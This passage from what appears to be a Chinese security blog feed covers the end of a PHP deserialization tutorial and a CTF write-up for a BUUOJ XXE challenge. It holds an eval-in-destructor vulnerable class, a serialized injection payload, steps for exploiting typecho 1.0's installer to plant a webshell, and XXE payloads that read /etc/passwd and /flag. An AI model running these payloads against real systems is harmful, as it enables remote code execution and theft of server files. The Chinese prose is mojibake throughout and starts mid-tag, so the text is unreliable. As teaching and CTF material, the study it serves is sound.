punctuation">:</span><span class="token string double-quoted-string">"score"</span><span class="token punctuation">;</span>d<span class="token punctuation">:</span><span class="token number">89.900000000000006</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token constant">STR</span><span class="token punctuation">;</span><span class="token variable">$stu1</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$stu1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$stu1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> è¿è¡Œè¿™ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–åçš„å¯¹è±¡ã€‚</p><blockquote><h4 id="EXï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–Demo"><a href="#EXï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–Demo" class="headerlink" title="EXï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–Demo"></a>EXï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–Demo</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Stutent</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$score</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sxk</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Stutent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"sxk"</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">=</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">score</span><span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token comment">//echo $sxk;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$sxk</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>STR</span>O:7:"Stutent":4:{s:4:"name";s:3:"sxk";s:3:"age";i:21;s:3:"sex";b:1;s:5:"score";i:90;}<span class="token delimiter symbol">STR<span class="token punctuation">;</span></span></span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%881.32.07.png" style="zoom:55%;"></blockquote><h2 id="2-4-æ¼æ´çš„äº§ç”Ÿ"><a href="#2-4-æ¼æ´çš„äº§ç”Ÿ" class="headerlink" title="2.4 æ¼æ´çš„äº§ç”Ÿ"></a>2.4 æ¼æ´çš„äº§ç”Ÿ</h2><ul><li>åˆ›å»ºä¸€ä¸ªç±»</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'AJEST;'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//echo "This is function __construct()";</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>åˆ›å»ºä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶åºåˆ—åŒ–</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¾—åˆ°å­—ç¬¦ä¸²</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>O:4:<span class="token string">"Test"</span>:1:<span class="token punctuation">{</span>s:3:<span class="token string">"str"</span><span class="token punctuation">;</span>s:6:<span class="token string">"AJEST;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ååºåˆ—åŒ–</li></ul><p>å°†å¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ååºåˆ—åŒ–æ³¨å…¥</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æ„é€ åºåˆ—åŒ–å­—ç¬¦<span class="token punctuation">[</span>O:4:<span class="token string">"Test"</span>:1:<span class="token punctuation">{</span>s:3:<span class="token string">"str"</span><span class="token punctuation">;</span>s:10:<span class="token string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span>ã€‚ä¼ å…¥code å‚æ•°ã€‚phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ä¼šè¢«æ‰§è¡Œã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”±ä»¥ä¸Šä»£ç ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼ŒPHP çš„ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸å…¶ä»–æ¼æ´é…åˆï¼Œæ¯”å¦‚ä»£ç æ‰§è¡Œã€SQLi ç­‰ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œææ„å‡½æ•°è°ƒç”¨<code>eval()</code>æ‰§è¡Œ`$strå­—ç¬¦ä¸²ï¼Œé—´æ¥å¯¼è‡´äº†å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="2-5-åŸå› åˆ†æ"><a href="#2-5-åŸå› åˆ†æ" class="headerlink" title="2.5 åŸå› åˆ†æ"></a>2.5 åŸå› åˆ†æ</h2><p>æˆ‘ä»¬æ³¨å…¥çš„å­—ç¬¦ä¸²[phpinfo()]ï¼Œä¸ºä»€ä¹ˆä¼šä½œä¸ºPHP è¯­å¥è¿è¡Œå‘¢ï¼Ÿè§‚å¯Ÿä»£ç ï¼Œå‘ç°åœ¨ç±»ä¸­æœ‰ä¸€ä¸ªå‡½æ•° <code>__destruct()</code> å¹¶ä¸”è¿™ä¸ªå‡½æ•°è°ƒç”¨çš„eval è¯­å¥ï¼Œæ‰§è¡Œ$this-&gt;str å˜é‡ã€‚ä¸ºä»€ä¹ˆ<code>__destruct()</code> æ²¡æœ‰è¢«è°ƒç”¨ï¼Œå‡½æ•°å†…çš„è¯­å¥å°±è¢«æ‰§è¡Œäº†å‘¢ï¼Ÿ</p><p>å½“é”€æ¯å®ä¾‹åŒ–ç±»(å¯¹è±¡)çš„æ—¶å€™ï¼Œ<code>__destrutc()</code> å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><h2 id="2-6-é­”æœ¯æ–¹æ³•"><a href="#2-6-é­”æœ¯æ–¹æ³•" class="headerlink" title="2.6 é­”æœ¯æ–¹æ³•"></a>2.6 é­”æœ¯æ–¹æ³•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">__construct<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šåˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨__destruct<span class="token punctuation">(</span><span class="token punctuation">)</span>: åœ¨é”€æ¯å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨__call<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨__callStatic<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨__get<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨__set<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šåœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ__set<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨__isset<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset<span class="token punctuation">(</span><span class="token punctuation">)</span> æˆ– empty<span class="token punctuation">(</span><span class="token punctuation">)</span> æ—¶ï¼Œ__isset<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨__unset<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ unset<span class="token punctuation">(</span><span class="token punctuation">)</span> æ—¶ï¼Œ__unset<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šè¢«è°ƒç”¨__sleep<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šserialize<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> ,å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šé²œå‘è°ƒç”¨ï¼Œç„¶åå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ__wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šunserialize<span class="token punctuation">(</span><span class="token punctuation">)</span> ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ä¼šå…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æº__toString<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š__toStringï¼ˆï¼‰ æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”å¢æ°§å›åº”__invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke<span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨__set_state<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šè‡ªPHP <span class="token number">5.1</span>.0 èµ·è°ƒç”¨ var_export<span class="token punctuation">(</span><span class="token punctuation">)</span> å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€ æ–¹æ³•ä¼šè¢«è°ƒç”¨__clone<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šå½“å¤åˆ¶å®Œæˆæ—¶ï¼Œå¦‚æœå®šä¹‰äº† __clone æ–¹æ³•ï¼Œåˆ™æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ï¼‰ä¸­çš„ __clone<span class="token punctuation">(</span><span class="token punctuation">)</span> æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼ã€‚__debugInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼šThis method is called by var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> anobject to get the properties that should be shown .If the method isn't on an object ,then all public ,protected and private propertieswill be shown.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€ååºåˆ—åŒ–æ¼æ´å®æˆ˜"><a href="#ä¸‰ã€ååºåˆ—åŒ–æ¼æ´å®æˆ˜" class="headerlink" title="ä¸‰ã€ååºåˆ—åŒ–æ¼æ´å®æˆ˜"></a>ä¸‰ã€ååºåˆ—åŒ–æ¼æ´å®æˆ˜</h1><h2 id="3-1-typecho1-0ååºåˆ—åŒ–æ¼æ´"><a href="#3-1-typecho1-0ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="3.1  typecho1.0ååºåˆ—åŒ–æ¼æ´"></a>3.1  typecho1.0ååºåˆ—åŒ–æ¼æ´</h2><h3 id="3-1-1-ç›®æ ‡-typecho1-0"><a href="#3-1-1-ç›®æ ‡-typecho1-0" class="headerlink" title="3.1.1 ç›®æ ‡ typecho1.0"></a>3.1.1 ç›®æ ‡ typecho1.0</h3><p>å®‰è£…ç›®æ ‡ç½‘ç«™ï¼Œæ•°æ®åº“å¯†ç  rootï¼Œç™»é™†å¯†ç  admin</p><p>æç¤ºæ— æ³•è¿æ¥æ•°æ®åº“ï¼šæ‰‹åŠ¨åˆ›å»ºæ•°æ®åº“ã€‚</p><p>åˆ›å»ºæ•°æ®åº“ï¼štypecho </p><p>æ•´ç†ï¼šutf8_gerneral_ci</p><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-04-14%20%E4%B8%8B%E5%8D%887.37.55.png" style="zoom:45%;"><h3 id="3-1-2-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"><a href="#3-1-2-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨" class="headerlink" title="3.1.2 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"></a>3.1.2 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h3><ul><li>å†™expï¼š</li></ul><p>typecho1.0_unserialize_exp.php</p><ul><li>ä¸Šä¼ åˆ°æœåŠ¡å™¨å¹¶è®¿é—®ï¼šè¿”å›base64ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li></ul><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%882.57.56.png" style="zoom:45%;"><ul><li>æµ‹è¯•phpinfo()ç”Ÿæˆçš„POCï¼š</li></ul><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%882.57.33.png" style="zoom:75%;"><ul><li>ä»£ç æ‰§è¡Œï¼š</li></ul><p>æˆ‘ä»¬å°†ä»¥ä¸Šä»£ç èµ‹å€¼ç»™<code>__typecho_config</code>å˜é‡</p><p>ç„¶åé€šè¿‡POSTæ–¹å¼æäº¤åˆ°é“¾æ¥<code>http://172.16.132.138/typechov11/install.php?finish=</code></p><p>å¹¶è®¾ç½® <code>Referer= http://172.16.132.138/typecho10/</code></p><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%883.11.24.png" style="zoom:75%;"><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%883.11.47.png" style="zoom:75%;"><p>å¯ä»¥çœ‹åˆ°phpinfo()ä»£ç æˆåŠŸæ‰§è¡Œã€‚</p><ul><li>æµ‹è¯•ä¸€å¥è¯æœ¨é©¬getshell:</li></ul><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%883.12.16.png" style="zoom:75%;"><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%883.12.57.png" style="zoom:75%;"><p>è¿›ä¸€æ­¥å¯ä»¥é€šè¿‡èšå‰‘è¿æ¥<code> http://192.168.33.4/typecho10/shell.php</code></p><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%883.16.06.png" style="zoom:55%;"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ååºåˆ—åŒ–æ¼æ´æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå®ƒå‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºå°†ä¸å¯ä¿¡çš„è¾“å…¥æ•°æ®ååºåˆ—åŒ–æˆå¯¹è±¡æ—¶ï¼Œå¦‚æœè¿™äº›æ•°æ®è¢«æ¶æ„æ„é€ ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€è®¿é—®æ•æ„Ÿæ•°æ®æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œè¿™ç§æ¼æ´å¸¸è§äºæ”¯æŒåºåˆ—åŒ–åŠŸèƒ½çš„ç¼–ç¨‹è¯­è¨€å’Œæ¡†æ¶ä¸­ï¼Œå¦‚Javaã€Pythonå’ŒPHPç­‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ–æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj-(BUU-XXE-COURSE-1)</title>
      <link href="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/"/>
      <url>/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204129119.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204309278.png" alt="img"></p><p>ç•Œé¢æ˜¯ä¸€ä¸ªç™»å½•æ¡†ã€‚</p><h1 id="äºŒã€åˆ†æ"><a href="#äºŒã€åˆ†æ" class="headerlink" title="äºŒã€åˆ†æ"></a>äºŒã€åˆ†æ</h1><p>æŠ“åŒ…ï¼š</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204708007.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204739020.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°æäº¤çš„æ˜¯ä¸€ä¸ªxmlæ–‡æ¡£ï¼Œrootå…ƒç´ ä¸‹é¢æœ‰usernameå’Œpasswordä¸¤ä¸ªå…ƒç´ ã€‚</p><p>æƒ³åˆ°ä½¿ç”¨XXEå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»è¯»å–æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ã€‚XXEæ¼æ´çš„å…·ä½“è¯¦è§£è§æœ¬ç«™<a href="#">ã€ŠXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´(XXE)ã€‹</a>ä¸€æ–‡ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><h2 id="3-1-payloadæ„é€ "><a href="#3-1-payloadæ„é€ " class="headerlink" title="3.1 payloadæ„é€ "></a>3.1 payloadæ„é€ </h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span>admin<span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯æ²¡æœ‰å›æ˜¾ã€‚</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212210932947.png" alt="img"></p><p>è§‚å¯Ÿå“åº”å†…å®¹ï¼Œåªæœ‰ç”¨æˆ·åè¢«å›æ˜¾äº†ï¼Œé‚£ä¹ˆå°†å¤–éƒ¨å®ä½“çš„å¼•ç”¨æ”¾åœ¨usernameæ ‡ç­¾ä¸­å³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///etc/passwd"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211151503.png" alt="img"></p><p>æˆåŠŸè¯»å–åˆ°<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹ã€‚</p><h2 id="3-2-è·å–flag"><a href="#3-2-è·å–flag" class="headerlink" title="3.2 è·å–flag"></a>3.2 è·å–flag</h2><p>åªéœ€è¦æ”¹å˜ä¸€ä¸‹è¯»å–çš„æ–‡ä»¶å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211354162.png" alt="img"></p><p>flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>e61193a8-c8ad-4238-9b97-b4e9a417d9c5<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-é—®é¢˜è®¨è®º"><a href="#3-3-é—®é¢˜è®¨è®º" class="headerlink" title="3.3 é—®é¢˜è®¨è®º"></a>3.3 é—®é¢˜è®¨è®º</h2><ul><li>å¿…é¡»æ˜¯<code>&lt;!DOCTYPE root</code>å—ï¼Ÿ</li></ul><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211604959.png" alt="img"></p><p>ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼ŒDOCTYPEå®šä¹‰çš„æ ¹å…ƒç´ å¯ä»¥ä¸æ˜¯rootã€‚</p><ul><li>é™¤äº†ç”¨fileåè®®å¤–ï¼Œèƒ½ç”¨php://filteråè®®å—ï¼Ÿ</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE xxx <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 